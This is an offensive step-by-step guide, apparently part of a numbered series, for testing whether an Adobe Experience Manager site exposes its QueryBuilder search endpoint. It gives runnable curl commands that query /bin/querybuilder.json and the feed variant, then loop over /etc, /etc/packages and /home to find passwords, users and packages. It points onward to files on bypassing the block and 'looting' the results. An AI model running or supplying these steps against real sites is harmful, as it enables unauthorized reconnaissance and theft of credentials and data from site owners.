# Batch 03 — Try the big search door (QueryBuilder)

## FILL IN

```bash
T="https://TARGET"
PAGE="/content/YOUR/PAGE"
```

## GOAL
See if `/bin/querybuilder.json` answers **without any trick**.

## TIME
~45–75 min

## YOU NEED
- `T` from batch 01

---

## WHY (30 seconds)

QueryBuilder is AEM’s **search box for the whole content tree**.  
Authors use it to find pages. Attackers use it to find passwords, users, and packages.  
Sites put a bouncer in front so the internet should get **404**.  
You always try the plain door first. Only if it is locked do you pick locks (batches 04–06).

---

## DO THIS

```bash
T="https://PUT-THE-SITE-HERE"
```

### 1) Plain search door

```bash
curl -sk -o /tmp/qb.json -w "qb:%{http_code} bytes=%{size_download}\n" \
  -G "$T/bin/querybuilder.json" \
  --data-urlencode "path=/content" \
  --data-urlencode "p.limit=5"
head -c 400 /tmp/qb.json; echo
```

### 2) Sister door (feed)

```bash
curl -sk -o /tmp/feed -w "feed:%{http_code} bytes=%{size_download}\n" \
  -G "$T/bin/querybuilder.feed" \
  --data-urlencode "path=/content" \
  --data-urlencode "p.limit=5"
head -c 300 /tmp/feed; echo
```

### 3) If step 1 worked — peek other roots (fast)

```bash
QB="$T/bin/querybuilder.json"
for path in /etc /etc/packages /home; do
  echo "=== $path ==="
  curl -sk -G "$QB" --data-urlencode "path=$path" --data-urlencode "p.limit=3" | head -c 200
  echo
done
```

### 4) Write down

```text
QB_OPEN: yes/no
QB_URL=   (only if yes)
```

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| JSON has `"hits"` or lots of results | Save `QB_URL`. **Skip 04–06 for now** → go **07** |
| 404 / empty | Go **NEXT** (04) |
| 401 / 403 | Note “needs login”. Still try 04–06 |

---

## NEXT
- Open door → [07-loot-querybuilder.md](./07-loot-querybuilder.md)  
- Locked door → [04-bypass-semicolon.md](./04-bypass-semicolon.md)
